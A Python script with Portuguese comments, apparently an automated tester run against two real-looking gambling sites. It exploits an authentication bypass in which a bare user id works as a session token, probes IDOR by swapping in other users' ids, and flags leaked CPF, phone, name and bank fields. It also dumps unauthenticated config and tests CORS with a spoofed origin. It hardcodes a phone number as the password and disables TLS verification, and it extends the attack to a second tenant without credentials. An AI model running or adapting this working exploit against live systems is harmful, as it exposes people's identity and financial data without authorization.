"""
auto_burp_v3.py — Bateria 3.

Foco:
- Mapeamento profundo do "token anão" em endpoints GET (apenas leitura)
- Replicação dos achados em ds.rainha777slots.com
- Coleta de campos sensíveis que vazam (nome, telefone, CPF, banco)
- Comparação entre tenants

Ética:
- Apenas GET (zero efeito colateral confirmado).
- Apenas uid próprio (137027) e uid sentinel (1, 99999).
- Throttle de 1.5s entre requests pra não bater o WAF.
- Sem escrita.
- Sem enumeração massiva.
"""
from __future__ import annotations
import urllib.request, urllib.error, ssl, json, time, os
from datetime import datetime, timezone

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

THROTTLE_SECONDS = 1.5

TENANTS = {
    "amizade777": {
        "host":       "ds.amizade777.com",
        "phone":      "21998498419",
        "password":   "21998498419",
        "device_id":  "0beb614f-8838-43ef-00fc-0029f7d5d20f",
        "uid_self":   137027,
        "uid_sonda":  1,
        "uid_invalido": 999999999,
    },
    "rainha777slots": {
        "host":       "ds.rainha777slots.com",
        # Sem credenciais. Vamos fazer só os testes que NÃO precisam de
        # token (config dump, security headers, rate limit) e os de
        # token anão usando uid sondas.
        "phone":      None,
        "password":   None,
        "device_id":  None,
        "uid_self":   None,
        "uid_sonda":  1,
        "uid_invalido": 999999999,
    },
}

# ───────────────────────── http helpers ─────────────────────────

def _req(method, url, headers=None, body=None, timeout=10):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json, */*"}
    if body is not None:
        h["Content-Type"] = "application/json"
    if headers:
        h.update(headers)
    data = json.dumps(body).encode() if body is not None else None
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=timeout, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read(16384).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        try:
            return e.code, dict(e.headers or {}), e.read(8192).decode("utf-8", "ignore")
        except Exception:
            return e.code, {}, ""
    except Exception as ex:
        return 0, {}, f"<EXC {type(ex).__name__}: {ex}>"

def get(host, path, token=None):
    h = {"Origin": f"https://{host}", "Referer": f"https://{host}/"}
    if token is not None:
        h["Token"] = str(token)
    url = f"https://{host}{path}"
    return _req("GET", url, h)

def post(host, path, body, token=None):
    h = {"Origin": f"https://{host}", "Referer": f"https://{host}/"}
    if token is not None:
        h["Token"] = str(token)
    url = f"https://{host}{path}"
    return _req("POST", url, h, body)

def safe_json(raw):
    try: return json.loads(raw)
    except: return {"_raw": raw[:300]}

# ───────────────────────── relatório ─────────────────────────

RESULTS = []
SEV = {"critical":"🔴","high":"🟠","medium":"🟡","low":"🔵","info":"⚪"}

def record(tenant, category, test, request, response, interp, sev="info"):
    e = {"ts": datetime.now(timezone.utc).isoformat(),
         "tenant": tenant, "category": category, "test": test,
         "request": request, "response": response,
         "interpretation": interp, "severity": sev}
    RESULTS.append(e)
    code = response.get("code", "?") if isinstance(response, dict) else "?"
    msg  = str(response.get("msg", ""))[:40] if isinstance(response, dict) else ""
    print(f"  {SEV.get(sev,'⚪')} [{tenant}/{category}/{test[:50]}] code={code} msg={msg!r}")
    if sev in ("critical", "high"):
        print(f"     ↪ {interp}")

# ═══════════════════════════════════════════════════════════════════
# BLOCO A — Mapa do token anão em endpoints GET (read-only)
# ═══════════════════════════════════════════════════════════════════

# Endpoints GET candidatos. TODOS são leitura. Lista curada de paths
# que apareceram no bundle JS / nas requests capturadas.
GET_ENDPOINTS = [
    "/japi/user/balance/querySimpleBalance",
    "/japi/user/balance/queryBalance",
    "/japi/user/balance/queryUserBalance",
    "/japi/user/info",
    "/japi/user/profile",
    "/japi/user/getUserInfo",
    "/japi/user/wallet",
    "/japi/user/realName",
    "/japi/user/recharge/list",
    "/japi/user/withdraw/list",
    "/japi/user/transaction/list",
    "/japi/user/bank/list",
    "/japi/user/vip/info",
    "/japi/user/vip/level",
    "/japi/user/invite/list",
    "/japi/user/invite/info",
    "/japi/user/invite/reward",
    "/japi/user/coupon/list",
    "/japi/user/notice/list",
    "/japi/user/message/list",
    # /prod-api/* — esses geralmente exigem strict, mas testamos
    "/prod-api/player/info",
    "/prod-api/recharge-list",
    "/prod-api/payment/withdraw-list",
    "/prod-api/invite/userInvite",
    "/prod-api/invite/getBindRewardRecord",
    "/prod-api/vip/info",
    "/prod-api/bank/list",
    "/prod-api/coupon/list",
    "/prod-api/activity/list",
    "/prod-api/game/list",
    "/prod-api/notice/list",
]

def block_dwarf_map_deep(tenant_name, tenant):
    print("\n" + "=" * 60)
    print(f"BLOCO A — DWARF TOKEN MAP DEEP — {tenant_name}")
    print("=" * 60)

    host  = tenant["host"]
    sonda = tenant["uid_sonda"]
    invalido = tenant["uid_invalido"]

    vulnerable = []
    for path in GET_ENDPOINTS:
        # 1) com token anão = uid sonda (provavelmente existe)
        st1, _, raw1 = get(host, path, token=sonda)
        time.sleep(THROTTLE_SECONDS)
        b1 = safe_json(raw1)

        # 2) com uid claramente inválido
        st2, _, raw2 = get(host, path, token=invalido)
        time.sleep(THROTTLE_SECONDS)
        b2 = safe_json(raw2)

        c1 = b1.get("code") if isinstance(b1, dict) else None
        c2 = b2.get("code") if isinstance(b2, dict) else None

        # Caso 1: aceita token sonda mas rejeita inválido = vuln
        if c1 == 200 and c2 != 200:
            data = b1.get("data")
            data_keys = list(data.keys()) if isinstance(data, dict) else None
            data_sample = json.dumps(data, ensure_ascii=False)[:400] if data else None

            # Detecta campos sensíveis pra escalar severidade
            sensitive_keys = ("phone","email","cpf","name","real_name",
                              "realName","bank_account","bankAccount",
                              "card","ip","client_ip","password",
                              "id_number","cnpj","address","whatsapp",
                              "telegram")
            leaked_sensitive = []
            if isinstance(data, dict):
                for k in data:
                    if any(s in k.lower() for s in sensitive_keys):
                        leaked_sensitive.append(k)

            sev = "critical" if leaked_sensitive else "high"
            vulnerable.append((path, data_keys, leaked_sensitive))
            record(tenant_name, "dwarf_map_deep", path,
                   {"path": path, "uid_sonda": sonda, "uid_invalido": invalido},
                   {"code_sonda": c1, "code_invalid": c2,
                    "data_keys": data_keys,
                    "leaked_sensitive_fields": leaked_sensitive,
                    "data_sample": data_sample},
                   ("Bypass de auth + vaza campos sensíveis: "
                    f"{leaked_sensitive}" if leaked_sensitive
                    else "Bypass de auth confirmado, sem PII visível neste endpoint."),
                   sev)
        elif c1 == 200 and c2 == 200:
            # Endpoint público (não autentica)
            record(tenant_name, "dwarf_map_deep", path,
                   {"path": path}, {"code_sonda": c1, "code_invalid": c2},
                   "Endpoint público (não exige token).", "low")

    print(f"\n  >>> {tenant_name}: {len(vulnerable)} endpoints VULNERÁVEIS via token anão.")
    for p, ks, ls in vulnerable:
        flag = f" 🔴 leaks: {ls}" if ls else ""
        print(f"     • {p}  campos: {ks}{flag}")

# ═══════════════════════════════════════════════════════════════════
# BLOCO B — Tentativa de IDOR profundo via token anão (sondas)
# ═══════════════════════════════════════════════════════════════════

def block_dwarf_idor(tenant_name, tenant):
    """Testa endpoints com query userId= usando token anão.

    Hipótese: se o caminho fraco do parser ignora o hash, talvez o
    endpoint use o uid do header Token (que vem do anão) MAS aceite
    o userId da query como override → IDOR completo sem hash.
    """
    print("\n" + "=" * 60)
    print(f"BLOCO B — DWARF + IDOR QUERY — {tenant_name}")
    print("=" * 60)

    host = tenant["host"]
    # Tokens-anão diferentes pra ver se o backend honra o uid
    sondas = [1, 137027, 137028, 999999999]

    paths_with_query = [
        "/japi/user/balance/querySimpleBalance?userId={uid}",
        "/japi/user/balance/queryBalance?userId={uid}",
        "/japi/user/info?userId={uid}",
        "/japi/user/profile?userId={uid}",
        "/japi/user/wallet?userId={uid}",
        "/japi/user/recharge/list?userId={uid}",
        "/japi/user/withdraw/list?userId={uid}",
    ]

    for path_tmpl in paths_with_query:
        # Estratégia: mantém o token-anão fixo em uid=1 e varia o ?userId=
        # Se o backend honrar a query, dados retornados mudam.
        results = []
        for query_uid in sondas:
            path = path_tmpl.format(uid=query_uid)
            st, _, raw = get(host, path, token=1)  # token-anão sempre 1
            time.sleep(THROTTLE_SECONDS)
            b = safe_json(raw)
            data = b.get("data") if isinstance(b, dict) else None
            results.append({
                "query_uid": query_uid,
                "code": b.get("code") if isinstance(b, dict) else None,
                "data": data,
            })

        # Compara: se data mudou conforme query_uid, IDOR confirmado
        codes = [r["code"] for r in results]
        # Se algum 200 com data dict
        succeeded = [r for r in results if r["code"] == 200 and isinstance(r["data"], dict)]
        if not succeeded:
            continue

        # Verifica se há diferença entre os retornos com diferentes uids
        unique_data = set()
        for r in succeeded:
            unique_data.add(json.dumps(r["data"], sort_keys=True))

        if len(unique_data) > 1:
            # Diferentes — query_uid é honrado
            record(tenant_name, "dwarf_idor", path_tmpl,
                   {"path_template": path_tmpl, "fixed_token": "1",
                    "varied_query_uids": sondas},
                   {"results_count": len(results), "succeeded": len(succeeded),
                    "unique_responses": len(unique_data),
                    "samples": [{"q": r["query_uid"], "data": r["data"]}
                                for r in succeeded]},
                   "IDOR completo — query userId é honrado mesmo com token anão.",
                   "critical")
        else:
            # Iguais — query é ignorada
            record(tenant_name, "dwarf_idor", path_tmpl,
                   {"path_template": path_tmpl},
                   {"unique_responses": 1,
                    "data_sample": list(unique_data)[0][:300]},
                   "Query userId ignorado (backend usa só o token).",
                   "info")

# ═══════════════════════════════════════════════════════════════════
# BLOCO C — Replicação dos achados conhecidos no rainha777slots
# ═══════════════════════════════════════════════════════════════════

def block_replicate_findings(tenant_name, tenant):
    print("\n" + "=" * 60)
    print(f"BLOCO C — REPLICAÇÃO F01-F05 EM {tenant_name}")
    print("=" * 60)

    host = tenant["host"]

    # F01 — Token anão
    st1, _, raw1 = get(host, "/japi/user/balance/querySimpleBalance", token=1)
    time.sleep(THROTTLE_SECONDS)
    b1 = safe_json(raw1)
    st2, _, raw2 = get(host, "/japi/user/balance/querySimpleBalance", token="zzz")
    time.sleep(THROTTLE_SECONDS)
    b2 = safe_json(raw2)
    c1 = b1.get("code") if isinstance(b1, dict) else None
    c2 = b2.get("code") if isinstance(b2, dict) else None
    if c1 == 200 and c2 != 200:
        data = b1.get("data") if isinstance(b1, dict) else None
        record(tenant_name, "replicate", "F01 token anão",
               {"path": "/japi/user/balance/querySimpleBalance"},
               {"code_dwarf": c1, "code_invalid": c2, "data": data},
               f"F01 confirmado em {tenant_name} — bypass + vaza saldo.",
               "critical")
    else:
        record(tenant_name, "replicate", "F01 token anão",
               {"path": "/japi/user/balance/querySimpleBalance"},
               {"code_dwarf": c1, "code_invalid": c2},
               f"F01 NÃO replicado em {tenant_name} (endpoint não existe ou está corrigido).",
               "info")

    # F03 — Security headers
    st, hdrs, _ = _req("GET", f"https://{host}/", {})
    expected = ["Strict-Transport-Security", "Content-Security-Policy",
                "X-Content-Type-Options", "X-Frame-Options",
                "Referrer-Policy", "Permissions-Policy"]
    present_lower = {k.lower() for k in hdrs.keys()}
    missing = [h for h in expected if h.lower() not in present_lower]
    record(tenant_name, "replicate", "F03 security headers",
           {"path": "/"},
           {"missing": missing, "present": list(hdrs.keys())},
           f"Faltam {len(missing)} headers." if missing else "Todos presentes.",
           "medium" if len(missing) >= 3 else "low" if missing else "info")
    time.sleep(THROTTLE_SECONDS)

    # F03.2 — CORS preflight
    st, hdrs, _ = _req("OPTIONS",
                       f"https://{host}/japi/user/balance/querySimpleBalance",
                       {"Origin": "https://attacker.com",
                        "Access-Control-Request-Method": "GET"})
    aco = hdrs.get("Access-Control-Allow-Origin", "")
    acc = hdrs.get("Access-Control-Allow-Credentials", "")
    record(tenant_name, "replicate", "F03 CORS preflight",
           {"origin": "https://attacker.com"},
           {"ACO": aco, "ACC": acc},
           f"ACO={aco!r}",
           "high" if aco == "*" and acc.lower() == "true" else
           "medium" if aco == "*" else "info")
    time.sleep(THROTTLE_SECONDS)

    # I02 — IP backend vazado (via /sign-in não vamos fazer aqui pra não bater WAF)
    # Em vez disso testamos /set/get sem token
    st, _, raw = post(host, "/prod-api/set/get",
                      {"appChannel": "pc", "appVersion": "1.0.0",
                       "appPackageName": "com.slots.big"})
    b = safe_json(raw)
    if isinstance(b, dict) and b.get("code") == 200:
        data = b.get("data") or {}
        sensitive = {k: data.get(k) for k in
                     ("ipWhites", "device_user_limit", "ip_user_limit",
                      "withdraw_min", "withdraw_max", "recharge_amount_max",
                      "ab_condition")
                     if k in data or k in (data.get("ab_condition") or {})}
        record(tenant_name, "replicate", "I03 config dump (sem auth)",
               {"path": "/prod-api/set/get"},
               {"http": st, "code": b.get("code"),
                "leaked_keys": list(sensitive.keys()),
                "ipWhites": (data.get("ab_condition") or {}).get("ipWhites")},
               f"Config dump funciona SEM autenticação em {tenant_name}.",
               "medium")
    time.sleep(THROTTLE_SECONDS)

# ═══════════════════════════════════════════════════════════════════
# Dump
# ═══════════════════════════════════════════════════════════════════

def dump_results():
    out_json = "auto_burp_v3_resultados.json"
    with open(out_json, "w", encoding="utf-8") as f:
        json.dump(RESULTS, f, ensure_ascii=False, indent=2, default=str)

    sev_order = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
    out_md = "auto_burp_v3_resultados.md"
    with open(out_md, "w", encoding="utf-8") as f:
        f.write("# Resultados — auto_burp_v3.py\n\n")
        f.write(f"_{datetime.now().isoformat()}_\n\n")
        from collections import Counter
        c = Counter(e["severity"] for e in RESULTS)
        f.write("## Resumo\n\n")
        for sev in ("critical","high","medium","low","info"):
            f.write(f"- {SEV.get(sev,'')} {sev}: {c.get(sev,0)}\n")
        f.write("\n## Achados (severidade desc)\n\n")
        for e in sorted(RESULTS, key=lambda x: sev_order.get(x["severity"],99)):
            if e["severity"] == "info":
                continue
            f.write(f"### [{e['severity'].upper()}] [{e['tenant']}] "
                    f"{e['category']} — {e['test']}\n\n")
            f.write(f"**Interpretação:** {e['interpretation']}\n\n")
            f.write("**Request:**\n```json\n")
            f.write(json.dumps(e["request"], ensure_ascii=False, indent=2, default=str))
            f.write("\n```\n\n**Response:**\n```json\n")
            f.write(json.dumps(e["response"], ensure_ascii=False, indent=2, default=str))
            f.write("\n```\n\n---\n\n")
    print(f"\n✅ Resultados em:\n  - {out_json}\n  - {out_md}")

def main():
    for tenant_name, tenant in TENANTS.items():
        try:
            block_dwarf_map_deep(tenant_name, tenant)
        except Exception as ex:
            print(f"[ERRO {tenant_name}/dwarf_map_deep]: {ex}")
        try:
            block_dwarf_idor(tenant_name, tenant)
        except Exception as ex:
            print(f"[ERRO {tenant_name}/dwarf_idor]: {ex}")
        try:
            block_replicate_findings(tenant_name, tenant)
        except Exception as ex:
            print(f"[ERRO {tenant_name}/replicate]: {ex}")
        time.sleep(3)
    dump_results()

if __name__ == "__main__":
    main()
